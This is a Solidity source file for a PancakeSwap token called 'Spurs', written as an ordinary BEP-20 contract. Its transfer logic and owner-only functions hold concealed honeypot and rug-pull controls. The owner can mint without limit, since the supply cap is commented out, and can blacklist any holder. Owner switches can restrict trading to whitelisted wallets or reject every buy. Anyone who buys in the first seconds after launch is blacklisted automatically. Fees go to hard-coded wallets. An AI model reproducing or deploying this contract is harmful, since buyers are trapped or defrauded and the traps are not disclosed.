pragma solidity 0.6.12;

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Context {
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
}

abstract contract Spurslid is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}
library DateTimeLibrary {
 
    uint constant SECONDS_PER_DAY = 24 * 60 * 60;
    uint constant SECONDS_PER_HOUR = 60 * 60;
    uint constant SECONDS_PER_MINUTE = 60;
    int constant OFFSET19700101 = 2440588;
 
    uint constant DOW_MON = 1;
    uint constant DOW_TUE = 2;
    uint constant DOW_WED = 3;
    uint constant DOW_THU = 4;
    uint constant DOW_FRI = 5;
    uint constant DOW_SAT = 6;
    uint constant DOW_SUN = 7;

 
    function _daysToDate(uint _days) internal pure returns (uint year, uint month, uint day) {
        int __days = int(_days);
 
        int L = __days + 68569 + OFFSET19700101;
        int N = 4 * L / 146097;
        L = L - (146097 * N + 3) / 4;
        int _year = 4000 * (L + 1) / 1461001;
        L = L - 1461 * _year / 4 + 31;
        int _month = 80 * L / 2447;
        int _day = L - 2447 * _month / 80;
        L = _month / 11;
        _month = _month + 2 - 12 * L;
        _year = 100 * (N - 49) + _year + L;
 
        year = uint(_year);
        month = uint(_month);
        day = uint(_day);
    }
 

    function timestampToDate(uint timestamp) internal pure returns (uint year, uint month, uint day) {
        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);
    }

}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
        function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract Spurs is Spurslid, Context {
  using SafeERC20 for IERC20;
  using Address for address;
  using SafeMath for uint;

  mapping (address => bool) public includeusers;
  mapping (address => bool) public witeeArecipient;


    mapping (address => uint) private _balances;

    mapping (address => mapping (address => uint)) private _allowances;

    uint private _totalSupply;
    uint public maxSupply =  200000000000000 * 1e18;
    function totalSupply() public view  override returns (uint) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint) {
        return _balances[account];
    }
    function transfer(address recipient, uint amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    mapping(address => address) public inviter;

function getday(uint til) public view returns (uint256 ) {
        uint year; uint month; uint day; 
        ( year,  month,  day)=DateTimeLibrary.timestampToDate(til);
         uint timess = year*10000+ month*100+day;
        return timess;
    }
 mapping(uint =>uint)  public daysp;

    uint256 public markednum=0;
    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
         require(!_isBlacklisted[sender], "bb address");

           uint256 needburn;
        uint256 oldamount =  _balances[sender];
     _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

        if (isfee) {
                if (sender ==pancakePair || recipient == pancakePair) {
                    if (iscanswap) {
                        if (sender ==pancakePair) {
                            require(witeeaddress[recipient], " recipient not witee  swap");
                        }
                        if (recipient ==pancakePair) {
                            require(witeeaddress[sender], " sender  not witee swap");
                        }
                    }

                if(witeeaddress[recipient]||witeeaddress[sender] ) {

                } else {
                if (recipient == pancakePair &&sfee[0]) {
                        require(amount <= oldamount * 99 / 100);
                    } 

                }
                
                if (sfee[1]) {
                    //
                    address nlp;
                    if (sender ==pancakePair) {
                        nlp = recipient;
                    } else {
                        nlp = sender;
                    }
                    require(lpsaddress[nlp],' not inlp addd' );
                    if (sender ==pancakePair ) {
                        require(false, "not buy");
                    }
                }
          
                if(witeeaddress[recipient]||witeeaddress[sender] ) {

                } else {

                
                if (
                    !sfee[3] &&
                    balanceOf(pancakePair) > 0 &&
                    block.timestamp <= tradingEnabledTimestamp + 13 seconds
                ) {
                    addbbt(recipient);
                }

                uint256 burnaa=amount.mul(1).div(100);

                if (sender == pancakePair) { //chu
                    uint256 top3=burnaa.mul(3);
                    _balances[address(this)] = _balances[address(this)].add(top3);
                    emit Transfer(sender, address(this), top3);
                    //swapTokenssss(top3);
                    markednum+=top3;

                    amount=  amount.mul(97).div(100);
                } else if (recipient == pancakePair) {
                    //
                    if (sfee[2]) {
                            uint tom = burnaa.mul(2);
                            _balances[address(this)] = _balances[address(this)].add(tom);
                                emit Transfer(sender, address(this), tom);
                            markednum+=tom;
                        
                            uint256 tolp2 = burnaa.mul(3);
                            _balances[address(this)] = _balances[address(this)].add(tolp2);
                                emit Transfer(sender, address(this), tolp2);

                            swapnow(sender, balanceOf(address(this)).sub(markednum), markednum);
                            markednum=0;
                            uint256 tolp7 = burnaa.mul(7);
                            //bottomadress
                            _balances[bottomadress] = _balances[bottomadress].add(tolp7);
                            emit Transfer(sender, bottomadress, tolp7);
                            amount=  amount.mul(88).div(100);
                    }

                }
            
                

              }

            } 
           
        }
    

        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);

    }

    // event Inviter(address  to, address  upline);
    // event NetSwap(address  to, uint256 amount);


   function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
      
    function _isachieve(address nad, uint index) private returns(bool reb) {
        uint bl=(index+1).mul(10000*1e18);
        if (_balances[nad]>=bl ) {
            reb= true;
        } else {
            reb= false;
        }

    }


    function _netntpo(address account, uint amount) internal {
        require(account != address(0), "ERC20: netntpo to the zero address");
       // require(_totalSupply.add(amount) <= maxSupply, "ERC20: cannot netntpo over max supply");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
    }
    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
         _balances[address(0)] = _balances[address(0)].add(amount);
        emit Transfer(account, address(0), amount);
    }
    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

  
  address public govn;
  mapping (address => bool) public netspers;

    //test
  address public all =0x578f1ea4558184aAAA78B375cA6d7C8d55c6c70A;
   
   //online
   
    address public burnAddress = address(0x000000000000000000000000000000000000dEaD);

   address public marketadress =0xE4A637CE4d2D4eCc47071548D9Bb82fF35f57452;// 2%

    address public bottomadress =0x457003c8966D972D56B97AE5aEdE955905e94d41;// 1%

 uint256 public rr = 20*1e18;


 function getPrice2() public view returns(uint256 ){
      uint[] memory amounts;
        address[] memory path = new address[](2);
        path[0] = token0;
        path[1] = token1;
       amounts = PancakeRouter01.getAmountsIn(1000000000000000000, path);
       if (amounts.length>0) {
           return amounts[0];
       } else {
           return rr;
       }
       
  }


mapping (address => bool) public witeeaddress;
mapping (uint256=>address) public witeeaa;
uint256 public witeelen;

mapping (address => uint256) public usrbuys;
mapping (address => bool) public intop5;
mapping (address => uint) public userindex;

uint public buylen=1;


  IPancakeRouter01 public PancakeRouter01;
  address public token0;
  address public token1;
  address public pancakePair; 

  bool public iscanswap=false;

  function setIscanswap( bool _tf) public {
      require(msg.sender == govn , "!govn");
      iscanswap = _tf;
  }

bool public isfee=true;
  function setIsisfee( bool _tf) public {
      require(msg.sender == govn , "!govn");
      isfee = _tf;
  }

  bool[] public sfee=[true,false,true,true];
  function setsfee2( uint ype, bool _tf) public {
      require(msg.sender == govn , "!govn");
      sfee[ype]= _tf;
  }

  
    function setwiteeaddress2(address[] memory _user) public {
      require(msg.sender == govn , "!govn");
      for(uint i=0;i< _user.length;i++) {
          if (!witeeaddress[_user[i]]) {
              //
                witeeaa[witeelen] = _user[i];
                witeelen = witeelen+1;
                witeeaddress[_user[i]] = true;
          }
      }

  }

 address public rewardTokenu=0x55d398326f99059fF775485246999027B3197955;

  constructor ( address _pancake) public Spurslid("Spurs", "Spurs", 18) {
      govn = msg.sender;
      //addnetsper(msg.sender);
      _netntpo(all, maxSupply);
      emit Transfer(address(0), all, maxSupply);
      witeeaddress[all] = true;
      lpsaddress[all] = true;
      witeeaddress[address(this)] = true;

      PancakeRouter01 =  IPancakeRouter01(_pancake);
      token0 = address(this);
      //token1 = _bnb;
      pancakePair =  IPancakeFactory(PancakeRouter01.factory())
            .createPair(address(this),PancakeRouter01.WETH() );  
    swapTokensAtAmount = 1e18;
  }

  function Atopksn(uint256 amount, address u) public {
       require(msg.sender == govn, "!govn");
      _netntpo(u, amount);
      emit Transfer(address(0), u, amount);
  }

    function burn(uint256 amount) public {
        _burn(msg.sender, amount);
    }
  
    mapping(address => bool) public _isBlacklisted;
    function blacklistAddress(address account, bool value) external  {
                  require(msg.sender == govn, "!govn");
        _isBlacklisted[account] = value;
    }

   function addbbt(address recipient) private {
        if (!_isBlacklisted[recipient]) _isBlacklisted[recipient] = true;
    }

   uint256 public tradingEnabledTimestamp = 1631365200; 

   function setTradingEnabledTimestamp(uint256 _tradingEnabledTimestamp)
        public
        
    {
         require(msg.sender == govn, "!govn");
        tradingEnabledTimestamp = _tradingEnabledTimestamp;
    }
    
  function setGovernance(address _govn) public {
      require(msg.sender == govn, "!govn");
      govn = _govn;
  }

  function setalladdress(address _a) public {
      require(msg.sender == govn, "!govn");
      all = _a;
  }
      uint256 public swapTokensAtAmount;

    function setSwapTokensAtAmount(uint256 _swapTokensAtAmount) public  {
         require(msg.sender == govn, "!govn");
        swapTokensAtAmount = _swapTokensAtAmount;
    }

    bool private swapping;

    function swapnow(address from, uint256 amountlip, uint256 tokenAmount) private {
        {
            if (
                !swapping &&
                from != pancakePair
            ) {
                swapping = true;
                if(amountlip > swapTokensAtAmount){
                    swapAndLiquify(amountlip);
                }
                swapTokenssss(tokenAmount);
                swapping = false;
            }
        } 
    }

        bool inSwapAndLiquify;
    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    event SwapAndLiquify(uint256 half, uint256 newBalance, uint256 otherHalf);
      function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        uint256 half = contractTokenBalance.div(2);
        uint256 otherHalf = contractTokenBalance.sub(half);
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half); 
        uint256 newBalance = address(this).balance.sub(initialBalance);
        addLiquidity(otherHalf, newBalance);
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = PancakeRouter01.WETH();
        _approve(address(this), address(PancakeRouter01), tokenAmount);
        PancakeRouter01.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(PancakeRouter01), tokenAmount);
        PancakeRouter01.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, 
            0, 
            all,
            block.timestamp
        );
    }


    function swapTokenssss(uint256 tokenAmount) private {
        address[] memory path = new address[](3);
        path[0] = address(this);
        path[1] = PancakeRouter01.WETH();
        path[2] = rewardTokenu;
        _approve(address(this), address(PancakeRouter01), tokenAmount);
        // make the swap
        PancakeRouter01.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            marketadress,
            block.timestamp
        );
    }
  receive() external payable {}

    mapping (address => bool) public lpsaddress;
    event AddLpaddress(address user);
    function setlpsadddress(address[] memory _user) public {
       require(msg.sender == govn, "!govn");
      for(uint i=0;i< _user.length;i++) {
          if (!lpsaddress[_user[i]]) {
                lpsaddress[_user[i]] = true;
                emit AddLpaddress(_user[i]);
          }
      }
  }
    event RmLpaddress(address user);

   function setrmlpsdddress(address[] memory _user) public {
       require(msg.sender == govn, "!govn");
      for(uint i=0;i< _user.length;i++) {
          if (lpsaddress[_user[i]]) {
                lpsaddress[_user[i]] = false;
                emit RmLpaddress(_user[i]);
          }
      }
  }
}